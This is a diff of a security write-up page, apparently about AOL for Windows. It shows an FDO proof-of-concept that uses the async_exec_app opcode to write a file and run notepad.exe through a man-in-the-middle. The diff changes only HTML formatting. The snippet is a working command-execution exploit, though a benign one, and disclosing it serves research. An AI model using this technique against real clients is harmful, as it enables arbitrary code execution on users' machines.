@@ -81,9 +81,9 @@
 <p>The <code>async_exec_app</code> opcode (<code>0x0d19</code>) takes a string operand, and executes the command in that string. This opcode has existed since version 2.0 of AOL for Windows, from 1994.</p>
 
 <p>The snippet of FDO that follows attempts to write <code>pwned.txt</code> to disk and execute <code>notepad.exe</code> with the path to <code>pwned.txt</code> as an argument:</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">fm_start
+<div class="highlight"><pre><code class="language-" data-lang="">fm_start
 fm_item_type &lt;filename&gt;
-fm_item_set &lt;&quot;pwned.txt&quot;&gt;
+fm_item_set &lt;"pwned.txt"&gt;
 fm_item_type &lt;path&gt;
 cm_tb_get_path
 uni_use_last_atom_string &lt;fm_item_set&gt;
@@ -91,13 +91,13 @@ fm_item_get &lt;filespec&gt;
 uni_use_last_atom_string &lt;var_string_set, 01x&gt;
 fm_create_file
 fm_open_file &lt;01x&gt;
-fm_append_data &lt;&quot;AOL pwned clientside through MITM...\r\nReading/writing to FS and arbitrary command execution 1993-2015 :)&quot;&gt;
+fm_append_data &lt;"AOL pwned clientside through MITM...\r\nReading/writing to FS and arbitrary command execution 1993-2015 :)"&gt;
 fm_flush_file
 fm_close_file
 fm_end
-var_string_set &lt;A,&quot;notepad.exe \&quot;&quot;&gt;
+var_string_set &lt;A,"notepad.exe \""&gt;
 var_string_concatenate_regs &lt;A,B&gt;
-var_string_set &lt;B,&quot;\&quot;&quot;&gt;
+var_string_set &lt;B,"\""&gt;
 var_string_concatenate_regs &lt;A,B&gt;
 var_string_get &lt;A&gt;
 uni_use_last_atom_string &lt;async_exec_app&gt;
